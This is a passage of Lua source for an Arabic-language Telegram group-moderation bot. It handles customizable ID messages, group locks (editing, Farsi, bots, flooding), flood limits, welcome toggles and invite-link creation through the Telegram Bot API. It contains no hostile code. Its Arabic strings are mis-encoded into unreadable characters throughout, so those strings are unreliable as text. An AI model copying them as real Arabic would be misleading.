Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุฑุฌุงุฆุง ุงุชุจุน ุงูุชุนูููุงุช ููุชุนููู \nโ๏ธูุทุจุน ูููุดุฉ ุงูุงูุฏู ุงุฑุณู ูููุดู ุชุญุชูู ุนูู ุงููุตูุต ุงูุชู ุจุงููุบู ุงูุงูุฌููุฒูู ุงุฏูุงู โซ โค\nโ โ โ โ โ โ โ โ โ\n `#username` โฌ ูุทุจุน ุงููุนุฑู\n `#id` โฌ ูุทุจุน ุงูุงูุฏู \n `#photos` โฌ ูุทุจุน ุนุฏุฏ ุงูุตูุฑ \n `#stast` โฌ ูุทุจุน ุงูุฑุชุจ \n `#msgs` โฌ ูุทุจุน ุนุฏุฏ ุงูุฑุณุงุฆู \n `#msgday` โฌ ูุทุจุน ุงูุฑุณุงุฆู ุงูููููู \n `#CustomTitle` โฌ ูุทุจุน ุงูููุจ \n `#bio` โฌ ูุทุจุน ุงูุจุงูู \n `#auto` โฌ ูุทุจุน ุงูุชูุงุนู \n `#game` โฌ ูุทุจุน ุนุฏุฏ ุงูููุงุท \n `#cont` โฌ ูุทุจุน ุนุฏุฏ ุงูุฌูุงุช \n `#edit` โฌ ูุทุจุน ุนุฏุฏ ุงูุณุญูุงุช \n `#Description` โฌ ูุทุจุน ุชุนููู ุงูุตูุฑ\nโ โ โ โ โ โ โ โ โ', 1, 'md')
Devmfm:set("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_,'mustafaTEAM')
return "mustafaTEAM"
end
if text and Manager(msg) and Devmfm:get("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then   
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุบุงุก ุญูุธ ูููุดุฉ ุงูุงูุฏู', 1, 'md')
Devmfm:del("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_)
return false
end
Devmfm:del("mustafa:New:id:"..mustafa..msg.chat_id_..msg.sender_user_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู', 1, 'md')
Devmfm:set(mustafa.."mfm:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^ุญุฐู ุงูุงูุฏู$") and ChCheck(msg) or text and text:match("^ูุณุญ ุงูุงูุฏู$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูููุดุฉ ุงูุงูุฏู")  
Devmfm:del(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
end
end
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ุงูุฏู$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function mustafaTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'ูุง ููุฌุฏ' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'ูุง ููุฌุฏ' end
local function getpro(extra, abbas, success) 
local msgsday = Devmfm:get(mustafa..'mfm:UsersMsgs'..mustafa..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = Devmfm:get(mustafa..'mfm:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(Devmfm:get(mustafa..'mfm:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"ูู ุตูุฑู ุธูู ุจุงููุจู ุ๐คค๐","ููุชูุน ุจุตูุฑุชู !ุ ๐น๐ค","ููุงู ููุงุณูู ุจูุฑูุจูู ุ๐คค๐","ููุงููู ุ๐คค๐","ูุดุฎู ุจุฑุจ ุ๐๐ค","ูุฒูุช ุจููุง ุฏุบูุฑูุง ุนุงุฏ ุ๐๐","ุตูุฑุชู ูุงูุฑุชุงุญููุง ุ๐๐ถ","ุญูุบูู ูุงููู ุ๐ฅบ๐","ูู ุตูุฑู ุบูุจูู ุจุฑุงุณูุง ูฆู? ุญุธ ุ๐น๐ค"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then 
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then 
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
newpicid = Devmfm:get(mustafa.."mfm:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'ูุง ููุฌุฏ')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
newpicid = newpicid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
newpicid = "โ๏ธ"..Description.."\nโ๏ธูุนุฑูู โซ โจ "..username.." โฉ\nโ๏ธุงูุฏูู โซ โจ "..msg.sender_user_id_.." โฉ\nโ๏ธุฑุชุจุชู โซ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธุฑุณุงุฆูู โซ โจ "..user_msgs.." โฉ\nโ๏ธุณุญูุงุชู โซ โจ "..edit_msg.." โฉ\nโ๏ธุชูุงุนูู โซ "..formsgs(msguser).."\nโ๏ธููุงุทู โซ โจ "..user_nkt.." โฉ\nโ โ โ โ โ โ โ โ โ\n"
end 
if not Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
newallid = Devmfm:get(mustafa.."mfm:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'ูุง ููุฌุฏ')) 
newallid = newallid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
newallid = newallid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
newallid = "โ๏ธูุนุฑูู โซ โจ "..username.." โฉ\nโ๏ธุงูุฏูู โซ โจ "..msg.sender_user_id_.." โฉ\nโ๏ธุฑุชุจุชู โซ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธุฑุณุงุฆูู โซ โจ "..user_msgs.." โฉ\nโ๏ธุณุญูุงุชู โซ โจ "..edit_msg.." โฉ\nโ๏ธุชูุงุนูู โซ "..formsgs(msguser).."\nโ๏ธููุงุทู โซ โจ "..user_nkt.." โฉ"
end 
if not Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = Devmfm:get(mustafa.."mfm:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'ูุง ููุฌุฏ')) 
local new_id = new_id:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
local new_id = new_id:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
Dev_mfm(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฐุฑุง ุงูุงูุฏู ูุนุทู ', 1, 'md')
end
else
if Devmfm:get(mustafa.."mfm:AllIds:Text") then
notpicid = Devmfm:get(mustafa.."mfm:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#photos',(abbas.total_count_ or 'ูุง ููุฌุฏ')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#cont',(cont or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ูุง ููุฌุฏ'))
notpicid = notpicid:gsub('#Description',(Description or 'ูุง ููุฌุฏ'))
else
notpicid = "โ๏ธูุง ุงุณุชุทูุน ุนุฑุถ ุตูุฑุชู ูุงูู ููุช ุจุญุธุฑ ุงูุจูุช ุงู ุงูู ูุงุชูุชูู ุตูุฑู ูู ุจุฑููุงููู\nโ โ โ โ โ โ โ โ โ\nโ๏ธูุนุฑูู โซ โจ "..username.." โฉ\nโ๏ธุงูุฏูู โซ โจ "..msg.sender_user_id_.." โฉ\nโ๏ธุฑุชุจุชู โซ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธุฑุณุงุฆูู โซ โจ "..user_msgs.." โฉ\nโ๏ธุณุญูุงุชู โซ โจ "..edit_msg.." โฉ\nโ๏ธุชูุงุนูู โซ "..formsgs(msguser).."\nโ๏ธููุงุทู โซ โจ "..user_nkt.." โฉ\nโ โ โ โ โ โ โ โ โ\n"
end 
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธูุนุฑูู โซ โจ "..username.." โฉ\nโ๏ธุงูุฏูู โซ โจ "..msg.sender_user_id_.." โฉ\nโ๏ธุฑุชุจุชู โซ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\nโ๏ธุฑุณุงุฆูู โซ โจ "..user_msgs.." โฉ\nโ๏ธุณุญูุงุชู โซ โจ "..edit_msg.." โฉ\nโ๏ธุฑุณุงุฆูู โซ โจ "..user_msgs.." โฉ\nโ๏ธุชูุงุนูู โซ "..formsgs(msguser).."\nโ๏ธููุงุทู โซ โจ "..user_nkt.." โฉ", 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนุฐุฑุง ุงูุงูุฏู ูุนุทู', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, mustafaTEAM)
end
end 
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^ููู (.*)$") then
local LockText = {string.match(text, "^(ููู) (.*)$")}
if LockText[2] == "ุงูุชุนุฏูู" then
if not Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชุนุฏูู")  
Devmfm:set(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชุนุฏูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุชุนุฏูู ุงูููุฏูุง" or LockText[2] == "ุชุนุฏูู ุงูููุฏูุง" then
if not Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุชุนุฏูู ุงูููุฏูุง")  
Devmfm:set(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชุนุฏูู ุงูููุฏูุง ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุฑุณูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุงุฑุณูู")  
Devmfm:set(mustafa..'mfm:Lock:Farsi'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑุณูู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุดุงุฑ" then
if Devmfm:get(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุดุงุฑ")  
Devmfm:del(mustafa..'mfm:Lock:Fshar'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุดุงุฑ ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุทุงุฆููู" then
if Devmfm:get(mustafa..'mfm:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุทุงุฆููู")  
Devmfm:del(mustafa..'mfm:Lock:Taf'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุทุงุฆููู ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูููุฑ" then
if Devmfm:get(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูููุฑ")  
Devmfm:del(mustafa..'mfm:Lock:Kfr'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุฑ ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงููุงุฑุณูู ุจุงูุทุฑุฏ" then
if not Devmfm:get(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุงุฑุณูู ุจุงูุทุฑุฏ")  
Devmfm:set(mustafa..'mfm:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑุณูู ุจุงูุทุฑุฏ ุจุงููุนู ููููู ', 1, 'md')
end
end
if LockText[2] == "ุงูุจูุชุงุช" or LockText[2] == "ุงูุจูุชุงุช ุจุงูุญุฐู" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุจูุชุงุช ุจุงูุญุฐู")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "ุงูุจูุชุงุช ุจุงูุทุฑุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุจูุชุงุช ุจุงูุทุฑุฏ")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "ุงูุจูุชุงุช ุจุงูุชูููุฏ" or LockText[2] == "ุงูุจูุชุงุช ุจุงูุชููุฏ" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุจูุชุงุช ุจุงูุชููุฏ")  
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ" or LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุญุฐู" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูุฑุงุฑ ุจุงูุญุฐู")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุชููุฏ" or LockText[2] == "ุงูุชูุฑุงุฑ ุจุงูุชูููุฏ" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูุฑุงุฑ ุจุงูุชููุฏ")  
end
if LockText[2] == "ุงูุชูุฑุงุฑ ุจุงููุชู" then 
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูุฑุงุฑ ุจุงููุชู")  
end
if BasicConstructor(msg) then
if LockText[2] == "ุงูุชุซุจูุช" then
if not Devmfm:get(mustafa..'mfm:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  Devmfm:set(mustafa.."mfm:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชุซุจูุช")  
Devmfm:set(mustafa..'mfm:Lock:Pin'..msg.chat_id_,true)
Devmfm:sadd(mustafa.."mfm:Lock:Pinpin",msg.chat_id_) 
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชุซุจูุช ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end end end
end
end
end
if Admin(msg) then
if text and (text:match("^ุถุน ุชูุฑุงุฑ (%d+)$") or text:match("^ูุถุน ุชูุฑุงุฑ (%d+)$")) then   
local TextSpam = text:match("ุถุน ุชูุฑุงุฑ (%d+)$") or text:match("ูุถุน ุชูุฑุงุฑ (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ุจุชุญุฏูุฏ ุนุฏุฏ ุงูุจุฑ ูู 2 ููุชูุฑุงุฑ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ูุถุน ุนุฏุฏ ุงูุชูุฑุงุฑ โซ '..TextSpam, 1, 'md')
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$") or text:match("^ูุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$")) then  
local TextSpam = text:match("ุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$") or text:match("ูุถุน ุฒูู ุงูุชูุฑุงุฑ (%d+)$")
Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ูุถุน ุฒูู ุงูุชูุฑุงุฑ โซ '..TextSpam, 1, 'md')
end
if Manager(msg) then
if text and text == 'ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูุฏู ุจุงูุตูุฑู ุจุงูุชุงููุฏ ููุนู', 1, 'md')
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู' and ChCheck(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูุฏู ุจุงูุตูุฑู ุจุงูุชุงููุฏ ูุนุทู', 1, 'md')
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'ุชูุนูู ุงูุงูุฏู' and ChCheck(msg) then
if not Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูุฏู ุจุงูุชุงููุฏ ููุนู ', 1, 'md')
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุงูุฏู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'ุชุนุทูู ุงูุงูุฏู' and ChCheck(msg) then
if Devmfm:get(mustafa..'mfm:Lock:Id'..msg.chat_id_) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูุฏู ุจุงูุชุงููุฏ ูุนุทู ', 1, 'md')
else
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุงูุฏู ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Lock:Id'..msg.chat_id_,true)
end end
end
if text == 'ุถุน ุฑุงุจุท' or text == 'ูุถุน ุฑุงุจุท' or text == 'ุถุน ุงูุฑุงุจุท' or text == 'ูุถุน ุงูุฑุงุจุท' then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ุฑุงุจุท ุงููุฌููุนู ุงู ุฑุงุจุท ููุงุฉ ุงููุฌููุนู', 1, 'md')
Devmfm:setex(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
if text == 'ุงูุดุงุก ุฑุงุจุท' or text == 'ุงูุดุงุก ุงูุฑุงุจุท' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not Devmfm:get(mustafa.."mfm:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
Devmfm:set(mustafa.."mfm:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุงูุดุงุก ุฑุงุจุท ุฌุฏูุฏ ุงุฑุณู โซ ุงูุฑุงุจุท', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููุณุช ูุฏู ุตูุงุญูุฉ ุฏุนูุฉ ุงููุณุชุฎุฏููู ุนุจุฑ ุงูุฑุงุจุท ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ุฑุงุจุท ุงููุฌููุนู ุงู ุฑุงุจุท ููุงุฉ ุงููุฌููุนู', 1, 'md')
Devmfm:setex(mustafa.."mfm:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
end
end
if Admin(msg) then
if text and text:match("^ุชูุนูู ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชูุนูู ุงูุชุฑุญูุจ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa.."mfm:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^ุชุนุทูู ุงูุชุฑุญูุจ$") and ChCheck(msg) then
local mustafaTEAM = 'โ๏ธุงููุง ุนุฒูุฒู โซ '..mfmRank(msg)..' \nโ๏ธุชู ุชุนุทูู ุงูุชุฑุญูุจ ุจูุฌุงุญ'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa.."mfm:Lock:Welcome"..msg.chat_id_)
end
if Devmfm:get(mustafa..'mfm:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'ุงูุบุงุก' then 
